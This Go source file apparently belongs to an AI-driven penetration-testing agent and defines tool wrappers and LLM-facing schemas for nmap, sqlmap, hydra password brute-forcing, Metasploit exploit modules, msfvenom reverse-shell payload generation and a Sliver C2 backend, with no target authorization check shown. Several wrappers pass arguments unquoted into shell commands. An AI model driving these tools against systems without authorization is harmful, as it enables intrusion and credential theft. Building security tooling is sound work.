package agent

// ─────────────────────────────────────────────────────────────────────────────
// Phase 2: Dedicated Tool Wrappers
//
// These replace raw shell_execute calls for the top 10 most-used pentest tools.
// Each wrapper hard-codes best-practice flags so the LLM only needs to specify
// the target and mode — NOT remember dozens of flags.
// ─────────────────────────────────────────────────────────────────────────────

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/0xP4X/drogonclaw-go/internal/c2"
	"github.com/0xP4X/drogonclaw-go/internal/cloud"
	"github.com/0xP4X/drogonclaw-go/internal/mitre"
	"github.com/0xP4X/drogonclaw-go/internal/shellutil"
	"github.com/openai/openai-go"
)

// resolveHttpx returns the path to projectdiscovery/httpx. The bare name
// "httpx" often resolves to the Python httpx CLI on many systems, which does
// not understand projectdiscovery flags (e.g. -silent, -tech-detect) and fails
// with cryptic "No such option" errors. We therefore probe candidates and
// verify the binary is actually projectdiscovery's.
func resolveHttpx() (string, error) {
	home, _ := os.UserHomeDir()
	candidates := []string{
		"httpx",
		"httpx-toolkit",
		filepath.Join(home, "go", "bin", "httpx"),
		filepath.Join(home, "go", "bin", "httpx-toolkit"),
		"/usr/local/bin/httpx",
		"/usr/local/bin/httpx-toolkit",
		"/usr/bin/httpx-toolkit",
		"/opt/pdtm/bin/httpx",
	}
	for _, c := range candidates {
		path, err := exec.LookPath(c)
		if err != nil {
			continue
		}
		out, err := exec.Command(path, "-version").CombinedOutput()
		if err == nil && (strings.Contains(string(out), "projectdiscovery") || strings.Contains(string(out), "Current Version")) {
			return path, nil
		}
	}
	return "", fmt.Errorf("projectdiscovery/httpx not found (the 'httpx' on PATH is the Python client). Install it with: go install github.com/projectdiscovery/httpx/cmd/httpx@latest — and ensure ~/go/bin precedes /usr/bin on PATH, or run inside the sandbox")
}

// resolveVolatility returns a usable Volatility 3 console script. The PyPI
// package has shipped under several entry-point names over time (vol, vol3,
// volatility3); pick the first one present on PATH.
func resolveVolatility() (string, error) {
	for _, name := range []string{"vol3", "vol", "volatility3"} {
		if path, err := exec.LookPath(name); err == nil {
			return path, nil
		}
	}
	return "", fmt.Errorf("volatility3 not found. Install it with: pipx install volatility3 (or pip install volatility3) and ensure its bin dir is on PATH")
}

// buildNmapFlags assembles nmap CLI flags for the given mode and optional
// explicit port list. When ports is non-empty it replaces any preset -p flag
// so we never emit two -p options (which makes nmap abort). -Pn is included in
// every mode because CTF/target hosts routinely block ICMP, which otherwise
// yields a false "Host seems down".
func buildNmapFlags(mode, ports string) string {
	var flags string
	switch strings.ToLower(mode) {
	case "quick":
		flags = "-Pn -sV -sC --open -T4 -p 80,443,22,21,25,8080,8443,3306,5432"
	case "udp":
		flags = "-Pn -sU --top-ports 200 -T4"
	case "vuln":
		flags = "-Pn -sV -sC --script vuln -T4"
	case "stealth":
		flags = "-Pn -sS -sV -T2 --randomize-hosts"
	case "full":
		flags = "-Pn -sV -sC -O -A -T4 -p-"
	default: // "default" or empty
		flags = "-Pn -sV -sC --open -T4"
	}
	if ports != "" && ports != "-" {
		fields := strings.Fields(flags)
		cleaned := make([]string, 0, len(fields))
		for i := 0; i < len(fields); i++ {
			if fields[i] == "-p" && i+1 < len(fields) {
				i++ // skip the port value that follows
				continue
			}
			if strings.HasPrefix(fields[i], "-p") {
				continue // joined form like "-p80,443" or "-p-"
			}
			cleaned = append(cleaned, fields[i])
		}
		flags = strings.Join(cleaned, " ")
		flags = fmt.Sprintf("%s -p %s", flags, ports)
	}
	return flags
}

// registerToolWrappers adds all structured tool wrappers to the registry.
// Called from registerBuiltins().
func (r *ToolRegistry) registerToolWrappers() {

	// ── 1. NMAP ──────────────────────────────────────────────────────────────
	r.builtins["run_nmap"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		mode, _ := args["mode"].(string)
		ports, _ := args["ports"].(string)
		if target == "" {
			return "[Error] target is required"
		}
		if ports == "" {
			ports = "-"
		}
		flags := buildNmapFlags(mode, ports)
		cmd := fmt.Sprintf("nmap %s %s 2>&1", flags, shellutil.Quote(target))
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[nmap Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[NMAP — %s — %s]\n%s", strings.ToUpper(mode), target, out)
	}

	// ── 2. NUCLEI ─────────────────────────────────────────────────────────────
	r.builtins["run_nuclei"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		severity, _ := args["severity"].(string)
		tags, _ := args["tags"].(string)
		dast, _ := args["dast"].(bool)
		if target == "" {
			return "[Error] target is required"
		}
		if severity == "" {
			severity = "critical,high,medium"
		}
		cmd := fmt.Sprintf("nuclei -u %s -severity %s -silent -timeout 10 -retries 2", shellutil.Quote(target), shellutil.Quote(severity))
		if dast {
			cmd += " -dast"
		}
		if tags != "" {
			cmd += fmt.Sprintf(" -tags %s", tags)
		}
		cmd += " 2>&1"
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[nuclei Error] %v\nOutput: %s", err, out)
		}
		if strings.TrimSpace(out) == "" {
			return fmt.Sprintf("[nuclei] Scan complete on %s — No vulnerabilities found matching severity: %s", target, severity)
		}
		return fmt.Sprintf("[NUCLEI — %s]\n%s", target, out)
	}

	// ── 3. GOBUSTER ───────────────────────────────────────────────────────────
	r.builtins["run_gobuster"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		mode, _ := args["mode"].(string)
		wordlist, _ := args["wordlist"].(string)
		extensions, _ := args["extensions"].(string)
		if target == "" {
			return "[Error] target is required"
		}
		if mode == "" {
			mode = "dir"
		}
		if wordlist == "" {
			wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
		}
		cmd := fmt.Sprintf("gobuster %s -u %s -w %s -t 40 -q --no-error", mode, shellutil.Quote(target), shellutil.Quote(wordlist))
		if extensions != "" && mode == "dir" {
			cmd += fmt.Sprintf(" -x %s", extensions)
		}
		cmd += " 2>&1"
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[gobuster Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[GOBUSTER — %s — %s]\n%s", strings.ToUpper(mode), target, out)
	}

	// ── 4. FFUF ───────────────────────────────────────────────────────────────
	r.builtins["run_ffuf"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		wordlist, _ := args["wordlist"].(string)
		mode, _ := args["mode"].(string)
		method, _ := args["method"].(string)
		if target == "" {
			return "[Error] target is required (use FUZZ as placeholder in URL)"
		}
		if wordlist == "" {
			wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
		}
		if method == "" {
			method = "GET"
		}
		// Ensure FUZZ is in target
		if !strings.Contains(target, "FUZZ") {
			target += "/FUZZ"
		}
		cmd := fmt.Sprintf("ffuf -u %s -w %s -X %s -mc 200,204,301,302,307,401,403 -t 40 -ac -s 2>&1",
			shellutil.Quote(target), shellutil.Quote(wordlist), shellutil.Quote(method))
		if mode == "parameter" {
			cmd = fmt.Sprintf("ffuf -u %s -w %s -X %s -mc 200,204,301,302 -t 20 -ac -s 2>&1",
				shellutil.Quote(target), shellutil.Quote(wordlist), shellutil.Quote(method))
		}
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[ffuf Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[FFUF — %s]\n%s", target, out)
	}

	// ── 5. SQLMAP ─────────────────────────────────────────────────────────────
	r.builtins["run_sqlmap"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		levelRaw, _ := args["level"].(float64)
		riskRaw, _ := args["risk"].(float64)
		data, _ := args["data"].(string)
		tamper, _ := args["tamper"].(string)
		if target == "" {
			return "[Error] target (URL) is required"
		}
		level := int(levelRaw)
		risk := int(riskRaw)
		if level == 0 {
			level = 2
		}
		if risk == 0 {
			risk = 2
		}
		cmd := fmt.Sprintf("sqlmap -u %s --batch --level %d --risk %d --threads 4 --timeout 30 --output-dir=/workspace/sqlmap_output",
			shellutil.Quote(target), level, risk)
		if data != "" {
			cmd += fmt.Sprintf(" --data=%q", data)
		}
		if tamper != "" {
			cmd += fmt.Sprintf(" --tamper=%s", tamper)
		}
		cmd += " 2>&1"
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[sqlmap Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[SQLMAP — %s]\n%s", target, out)
	}

	// ── 6. SUBFINDER ──────────────────────────────────────────────────────────
	r.builtins["run_subfinder"] = func(ctx context.Context, args map[string]any) string {
		domain, _ := args["domain"].(string)
		allSources, _ := args["all_sources"].(bool)
		if domain == "" {
			return "[Error] domain is required"
		}
		cmd := fmt.Sprintf("subfinder -d %s -silent -timeout 30", shellutil.Quote(domain))
		if allSources {
			cmd += " -all"
		}
		cmd += " 2>&1"
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			if strings.Contains(out, "command not found") || strings.Contains(out, "not found") {
				return "[subfinder Error] subfinder is not installed. Install it with: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest (or run inside the sandbox which provisions it)."
			}
			return fmt.Sprintf("[subfinder Error] %v\nOutput: %s", err, out)
		}
		trimmed := strings.TrimSpace(out)
		if trimmed == "" {
			return fmt.Sprintf("[SUBFINDER — %s] Found 0 subdomains:\n(no results)", domain)
		}
		lines := strings.Split(trimmed, "\n")
		count := 0
		for _, l := range lines {
			if strings.TrimSpace(l) != "" {
				count++
			}
		}
		return fmt.Sprintf("[SUBFINDER — %s] Found %d subdomains:\n%s", domain, count, trimmed)
	}

	// ── 7. HTTPX ──────────────────────────────────────────────────────────────
	r.builtins["run_httpx"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		if target == "" {
			return "[Error] target is required"
		}
		bin, err := resolveHttpx()
		if err != nil {
			return fmt.Sprintf("[httpx Error] %v", err)
		}
		cmd := fmt.Sprintf("echo %s | %s -silent -tech-detect -status-code -title -server -content-length -follow-redirects -timeout 10 2>&1",
			shellutil.Quote(target), bin)
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[httpx Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[HTTPX — %s]\n%s", target, out)
	}

	// ── 8. CHECKSEC ───────────────────────────────────────────────────────────
	r.builtins["run_checksec"] = func(ctx context.Context, args map[string]any) string {
		binaryPath, _ := args["binary_path"].(string)
		if binaryPath == "" {
			return "[Error] binary_path is required"
		}
		cmd := fmt.Sprintf(`
file %s
echo "---"
if command -v checksec >/dev/null 2>&1; then checksec --file=%s 2>/tmp/checksec.err || cat /tmp/checksec.err; else echo "[!] checksec not installed — apt install checksec (or download checksec.sh)"; fi
echo "---"
strings -n 8 %s | head -60
echo "---"
ldd %s 2>/dev/null | head -20
`, shellutil.Quote(binaryPath), shellutil.Quote(binaryPath), shellutil.Quote(binaryPath), shellutil.Quote(binaryPath))
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[checksec Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[CHECKSEC — %s]\n%s", binaryPath, out)
	}

	// ── 9. HYDRA ──────────────────────────────────────────────────────────────
	r.builtins["run_hydra"] = func(ctx context.Context, args map[string]any) string {
		target, _ := args["target"].(string)
		service, _ := args["service"].(string)
		userlist, _ := args["userlist"].(string)
		passlist, _ := args["passlist"].(string)
		singleUser, _ := args["username"].(string)
		singlePass, _ := args["password"].(string)
		if target == "" || service == "" {
			return "[Error] target and service are required (services: ssh, ftp, http-post-form, smb, rdp, mysql, postgres)"
		}
		if userlist == "" && singleUser == "" {
			userlist = "/usr/share/wordlists/metasploit/unix_users.txt"
		}
		if passlist == "" && singlePass == "" {
			passlist = "/usr/share/wordlists/rockyou.txt"
		}

		uFlag := fmt.Sprintf("-L %s", shellutil.Quote(userlist))
		if singleUser != "" {
			uFlag = fmt.Sprintf("-l %s", shellutil.Quote(singleUser))
		}
		pFlag := fmt.Sprintf("-P %s", shellutil.Quote(passlist))
		if singlePass != "" {
			pFlag = fmt.Sprintf("-p %s", shellutil.Quote(singlePass))
		}

		cmd := fmt.Sprintf("hydra -t 4 -f -q %s %s %s %s 2>&1", uFlag, pFlag, shellutil.Quote(target), shellutil.Quote(service))
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[hydra Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[HYDRA — %s — %s]\n%s", service, target, out)
	}

	// ── 10. BINWALK / FORENSICS TRIAGE ───────────────────────────────────────
	r.builtins["run_forensics_triage"] = func(ctx context.Context, args map[string]any) string {
		filePath, _ := args["file_path"].(string)
		if filePath == "" {
			return "[Error] file_path is required"
		}
		cmd := fmt.Sprintf(`
echo "=== FILE TYPE ==="
file %s
echo ""
echo "=== EXIFTOOL ==="
exiftool %s 2>/dev/null || echo "[!] exiftool not installed"
echo ""
echo "=== STRINGS (top 40) ==="
strings -n 6 %s | head -40
echo ""
echo "=== BINWALK ==="
binwalk %s 2>/dev/null || echo "[!] binwalk not installed"
echo ""
echo "=== HEX PREVIEW (first 64 bytes) ==="
xxd %s | head -4
echo ""
echo "=== STEGHIDE ==="
if command -v steghide >/dev/null 2>&1; then echo "" | steghide info %s 2>&1 | head -8; else echo "[!] steghide not installed"; fi
echo ""
echo "=== ZSTEG ==="
if command -v zsteg >/dev/null 2>&1; then zsteg %s 2>&1 | head -10; else echo "[!] zsteg not installed"; fi
echo ""
echo "=== FOREMOST (carving to /workspace/foremost) ==="
if command -v foremost >/dev/null 2>&1; then rm -rf /workspace/foremost && mkdir -p /workspace/foremost && foremost -q -o /workspace/foremost -i %s 2>&1 | tail -3 && ls /workspace/foremost 2>/dev/null; else echo "[!] foremost not installed"; fi
echo ""
echo "=== CUSTOM INFO (if image) ==="
exif %s 2>/dev/null | head -20 || true
`, shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath), shellutil.Quote(filePath))
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[forensics_triage Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[FORENSICS TRIAGE — %s]\n%s", filePath, out)
	}

	// ── 11. ANGR (Symbolic Execution) ─────────────────────────────────────────
	r.builtins["run_angr"] = func(ctx context.Context, args map[string]any) string {
		binaryPath, _ := args["binary_path"].(string)
		findAddr, _ := args["find_addr"].(string)
		avoidAddr, _ := args["avoid_addr"].(string)
		if binaryPath == "" || findAddr == "" {
			return "[Error] binary_path and find_addr are required"
		}

		script := fmt.Sprintf(`import angr
import sys

print("[*] Loading project...")
p = angr.Project("%s", auto_load_libs=False)
state = p.factory.entry_state()
simgr = p.factory.simgr(state)

find_addr = int("%s", 16) if "%s".startswith("0x") else "%s"
avoid_addr = int("%s", 16) if "%s".startswith("0x") and "%s" != "" else None

print(f"[*] Exploring... Find: {hex(find_addr) if isinstance(find_addr, int) else find_addr}")
if avoid_addr:
    print(f"[*] Avoiding: {hex(avoid_addr)}")
    simgr.explore(find=find_addr, avoid=avoid_addr)
else:
    simgr.explore(find=find_addr)

if simgr.found:
    print("[+] Found a path!")
    found_state = simgr.found[0]
    print("[+] stdin payload:")
    print(found_state.posix.dumps(0))
else:
    print("[-] No path found.")
`, binaryPath, findAddr, findAddr, findAddr, avoidAddr, avoidAddr, avoidAddr)

		// Write script to sandbox and run
		scriptPath := "/workspace/angr_solve.py"
		err := r.sandbox.WriteFile(ctx, scriptPath, script)
		if err != nil {
			return fmt.Sprintf("[angr Error] Failed to write script: %v", err)
		}
		out, err := r.sandbox.Execute(ctx, "python3 "+scriptPath)
		if err != nil {
			return fmt.Sprintf("[angr Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[ANGR — %s]\n%s", binaryPath, out)
	}

	// ── 12. ROPPER (ROP Gadget Search) ────────────────────────────────────────
	r.builtins["run_ropper"] = func(ctx context.Context, args map[string]any) string {
		binaryPath, _ := args["binary_path"].(string)
		search, _ := args["search"].(string)
		if binaryPath == "" {
			return "[Error] binary_path is required"
		}
		cmd := fmt.Sprintf("ropper --file %s", binaryPath)
		if search != "" {
			cmd += fmt.Sprintf(" --search %q", search)
		} else {
			cmd += " --type rop"
		}
		cmd += " 2>&1"
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[ropper Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[ROPPER — %s]\n%s", binaryPath, out)
	}

	// ── 13. ONE_GADGET (libc Exploitation) ────────────────────────────────────
	r.builtins["run_one_gadget"] = func(ctx context.Context, args map[string]any) string {
		libcPath, _ := args["libc_path"].(string)
		if libcPath == "" {
			return "[Error] libc_path is required"
		}
		cmd := fmt.Sprintf("one_gadget %s 2>&1", libcPath)
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[one_gadget Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[ONE_GADGET — %s]\n%s", libcPath, out)
	}

	// ── 14. PWNTOOLS (Exploit Script Runner) ──────────────────────────────────
	r.builtins["run_pwntools"] = func(ctx context.Context, args map[string]any) string {
		script, _ := args["script"].(string)
		if script == "" {
			return "[Error] script content is required"
		}
		scriptPath := "/workspace/exploit.py"
		err := r.sandbox.WriteFile(ctx, scriptPath, script)
		if err != nil {
			return fmt.Sprintf("[pwntools Error] Failed to write script: %v", err)
		}
		out, err := r.sandbox.Execute(ctx, "python3 "+scriptPath+" 2>&1")
		if err != nil {
			return fmt.Sprintf("[pwntools Error] Execution failed: %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[PWNTOOLS EXPLOIT RUN]\n%s", out)
	}

	// ── 15. VOLATILITY 3 (Memory Forensics) ───────────────────────────────────
	// The PyPI package historically installs different console-script names
	// (vol / vol3 / volatility3). Probe all three so the wrapper works across
	// apt, pipx, and pip installations instead of hard-coding a single name.
	r.builtins["run_volatility3"] = func(ctx context.Context, args map[string]any) string {
		memFile, _ := args["mem_file"].(string)
		plugin, _ := args["plugin"].(string)
		if memFile == "" || plugin == "" {
			return "[Error] mem_file and plugin are required (e.g., windows.pslist, linux.psaux)"
		}
		bin, err := resolveVolatility()
		if err != nil {
			return fmt.Sprintf("[volatility3 Error] %v", err)
		}
		cmd := fmt.Sprintf("%s -f %s %s 2>&1", shellutil.Quote(bin), shellutil.Quote(memFile), shellutil.Quote(plugin))
		out, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[volatility3 Error] %v\nOutput: %s", err, out)
		}
		return fmt.Sprintf("[VOLATILITY3 — %s — %s]\n%s", plugin, memFile, out)
	}

	// ── 16. PROWLER (multi-cloud CSPM) ───────────────────────────────────────
	// Wraps the external Prowler CLI (orchestration, not reimplementation) to
	// absorb its 1000+ multi-cloud posture checks — extends internal/cloud
	// beyond the existing AWS-IAM enumeration without duplicating Prowler.
	r.builtins["run_prowler"] = func(ctx context.Context, args map[string]any) string {
		provider, _ := args["provider"].(string)
		account, _ := args["account"].(string)
		region, _ := args["region"].(string)
		if provider == "" {
			provider = "aws"
		}
		opts := cloud.Options{Account: account, Region: region}
		if envRaw, ok := args["creds_json"].(string); ok && envRaw != "" {
			var env map[string]string
			if err := json.Unmarshal([]byte(envRaw), &env); err == nil {
				opts.Env = env
			}
		}
		findings, err := cloud.RunProwler(ctx, r.sandbox, cloud.Provider(provider), opts)
		if err != nil {
			return fmt.Sprintf("[prowler Error] %v", err)
		}
		if len(findings) == 0 {
			return fmt.Sprintf("[prowler] No FAIL findings for %s (account=%s).", provider, account)
		}
		var b strings.Builder
		fmt.Fprintf(&b, "[PROWLER — %s — %d FAIL findings]\n", provider, len(findings))
		for _, f := range findings {
			fmt.Fprintf(&b, "- [%s] %s | %s | %s | %s\n", f.Severity, f.CheckID, f.Service, f.Resource, f.Message)
			if r.lootDb != nil {
				_ = r.lootDb.InsertVulnerability(
					fmt.Sprintf("%s:%s", f.Provider, f.Account),
					"",
					fmt.Sprintf("[%s] %s — %s", f.CheckID, f.Service, f.Message),
					strings.ToLower(f.Severity),
				)
			}
		}
		return b.String()
	}

	// ── 17. ATT&CK EMULATION PLANNER ──────────────────────────────────────
	// Promotes the embedded techniqueDB into a Caldera-style, kill-chain-ordered
	// emulation plan. Reuses mitre.BuildEmulationPlan — no parallel planner.
	r.builtins["run_attack_plan"] = func(ctx context.Context, args map[string]any) string {
		toolsRaw, _ := args["tools"].(string)
		var available []string
		if toolsRaw != "" {
			for _, t := range strings.Split(toolsRaw, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					available = append(available, t)
				}
			}
		} else {
			available = mitre.DefaultToolSet()
		}
		steps := mitre.BuildEmulationPlan(available)
		return mitre.RenderEmulationPlan(steps)
	}

	// ── 18. SLIVER C2 BACKEND ───────────────────────────────────────────────
	// Wraps the operator's own Sliver server (orchestration only) as a C2
	// backend beside the Telegram gateway. No Sliver code is forked.
	r.builtins["run_sliver"] = func(ctx context.Context, args map[string]any) string {
		sub, _ := args["subcommand"].(string)
		rest, _ := args["args"].(string)
		be := c2.NewSliverBackend(r.sandbox.Execute)
		out, err := be.Run(ctx, sub, rest)
		if err != nil {
			return fmt.Sprintf("[sliver Error] %v", err)
		}
		if strings.TrimSpace(out) == "" {
			return "[sliver] command dispatched (no output)."
		}
		return "[SLIVER]\n" + out
	}

	// ── 19. METASPLOIT FRAMEWORK ──────────────────────────────────────────────
	r.builtins["run_metasploit"] = func(ctx context.Context, args map[string]any) string {
		module, _ := args["module"].(string)
		options, _ := args["options"].(string)
		if module == "" {
			return "[Error] module is required (e.g. 'exploit/multi/http/maradb_rce')"
		}
		cmd := fmt.Sprintf("msfconsole -q -x 'use %s; %s; run; exit'", module, options)
		res, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[Metasploit Error] %v\nOutput: %s", err, res)
		}
		return fmt.Sprintf("[MSFCONSOLE — %s]\n%s", module, res)
	}

	// ── 20. MSFVENOM PAYLOAD GENERATOR ───────────────────────────────────────
	r.builtins["run_msfvenom"] = func(ctx context.Context, args map[string]any) string {
		payload, _ := args["payload"].(string)
		lhost, _ := args["lhost"].(string)
		lport, _ := args["lport"].(string)
		format, _ := args["format"].(string)
		out, _ := args["output_file"].(string)
		if payload == "" || lhost == "" || lport == "" {
			return "[Error] payload, lhost, and lport are required"
		}
		if format == "" {
			format = "elf"
		}
		if out == "" {
			out = "/tmp/payload." + format
		}
		cmd := fmt.Sprintf("msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s", payload, lhost, lport, format, out)
		res, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[MSFVenom Error] %v\nOutput: %s", err, res)
		}
		return fmt.Sprintf("[MSFVENOM — %s] Payload generated at %s\n%s", payload, out, res)
	}
}

// toolWrapperDefinitions returns LLM-facing tool schemas for all wrappers.
func toolWrapperDefinitions() []openai.ChatCompletionToolParam {
	return []openai.ChatCompletionToolParam{
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_nmap",
				Description: openai.String("Structured Nmap wrapper with pre-optimised flags. Modes: quick, full, vuln, stealth, udp. Eliminates flag guesswork."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target": map[string]interface{}{"type": "string", "description": "IP, hostname, CIDR range, or URL"},
						"mode":   map[string]interface{}{"type": "string", "description": "quick | full | vuln | stealth | udp (default: default)"},
						"ports":  map[string]interface{}{"type": "string", "description": "Optional specific port range e.g. '80,443,8080' (default: top-1000)"},
					},
					"required": []string{"target"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_nuclei",
				Description: openai.String("Structured Nuclei wrapper. Adds -silent, -timeout, -retries best-practice flags. Set dast=true to enable Nuclei's DAST/fuzzing templates for unknown-vulnerability discovery."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target":   map[string]interface{}{"type": "string", "description": "URL to scan"},
						"severity": map[string]interface{}{"type": "string", "description": "critical,high,medium,low (default: critical,high,medium)"},
						"tags":     map[string]interface{}{"type": "string", "description": "Optional comma-separated tags e.g. 'rce,sqli,xss,api,jwt'"},
						"dast":     map[string]interface{}{"type": "boolean", "description": "Enable DAST/fuzzing templates for active unknown-vuln discovery (default: false)"},
					},
					"required": []string{"target"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_gobuster",
				Description: openai.String("Structured Gobuster directory/subdomain brute-forcer. Uses sensible defaults for wordlist and threads."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target":     map[string]interface{}{"type": "string", "description": "Target URL or domain"},
						"mode":       map[string]interface{}{"type": "string", "description": "dir | dns | vhost (default: dir)"},
						"wordlist":   map[string]interface{}{"type": "string", "description": "Wordlist path (default: dirbuster medium list)"},
						"extensions": map[string]interface{}{"type": "string", "description": "File extensions to check e.g. 'php,html,js,txt'"},
					},
					"required": []string{"target"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_ffuf",
				Description: openai.String("Structured FFUF fuzzer. Automatically adds -mc, -ac, -t flags. Place FUZZ in target URL where you want fuzzing."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target":   map[string]interface{}{"type": "string", "description": "URL with FUZZ placeholder e.g. http://target.com/FUZZ"},
						"wordlist": map[string]interface{}{"type": "string", "description": "Wordlist path (default: dirbuster medium)"},
						"method":   map[string]interface{}{"type": "string", "description": "HTTP method: GET | POST (default: GET)"},
						"mode":     map[string]interface{}{"type": "string", "description": "directory | parameter (default: directory)"},
					},
					"required": []string{"target"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_sqlmap",
				Description: openai.String("Structured SQLMap wrapper. Always passes --batch to avoid interactive prompts. Never forgets risk/level flags."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target": map[string]interface{}{"type": "string", "description": "Target URL with injectable parameter e.g. 'http://site.com/page?id=1'"},
						"level":  map[string]interface{}{"type": "integer", "description": "Test level 1-5 (default: 2)"},
						"risk":   map[string]interface{}{"type": "integer", "description": "Risk level 1-3 (default: 2)"},
						"data":   map[string]interface{}{"type": "string", "description": "POST body data if testing POST parameters"},
						"tamper": map[string]interface{}{"type": "string", "description": "Tamper scripts e.g. 'space2comment,between'"},
					},
					"required": []string{"target"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_subfinder",
				Description: openai.String("Structured Subfinder passive subdomain enumeration. Returns a clean list of discovered subdomains."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"domain":      map[string]interface{}{"type": "string", "description": "Root domain e.g. example.com"},
						"all_sources": map[string]interface{}{"type": "boolean", "description": "Use all sources including slow ones (default: false)"},
					},
					"required": []string{"domain"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_httpx",
				Description: openai.String("Structured HTTPX web prober. Detects technologies, status codes, titles, and server headers in one call."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target": map[string]interface{}{"type": "string", "description": "URL, domain, or IP to probe"},
					},
					"required": []string{"target"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_checksec",
				Description: openai.String("Run complete binary security analysis: file type, checksec protections (NX/PIE/RELRO/canary), strings, and linked libraries. ALWAYS use this before any binary exploitation."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"binary_path": map[string]interface{}{"type": "string", "description": "Full path to binary inside sandbox e.g. /workspace/chall"},
					},
					"required": []string{"binary_path"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_hydra",
				Description: openai.String("Structured Hydra credential brute-forcer. Specify service and target — wordlists default to rockyou.txt/unix_users.txt automatically."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target":   map[string]interface{}{"type": "string", "description": "Target IP or hostname"},
						"service":  map[string]interface{}{"type": "string", "description": "Protocol: ssh, ftp, http-post-form, smb, rdp, mysql, postgres, telnet"},
						"userlist": map[string]interface{}{"type": "string", "description": "Path to username wordlist (optional, default: unix_users.txt)"},
						"passlist": map[string]interface{}{"type": "string", "description": "Path to password wordlist (optional, default: rockyou.txt)"},
						"username": map[string]interface{}{"type": "string", "description": "Single username to test (overrides userlist)"},
						"password": map[string]interface{}{"type": "string", "description": "Single password to test (overrides passlist)"},
					},
					"required": []string{"target", "service"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_forensics_triage",
				Description: openai.String("Run complete forensics triage on a file: file type, exiftool metadata, strings, binwalk embedded files, and hex preview. Use for any unknown/suspicious file in CTF or IR."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"file_path": map[string]interface{}{"type": "string", "description": "Full path to file in sandbox e.g. /workspace/mystery.png"},
					},
					"required": []string{"file_path"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_angr",
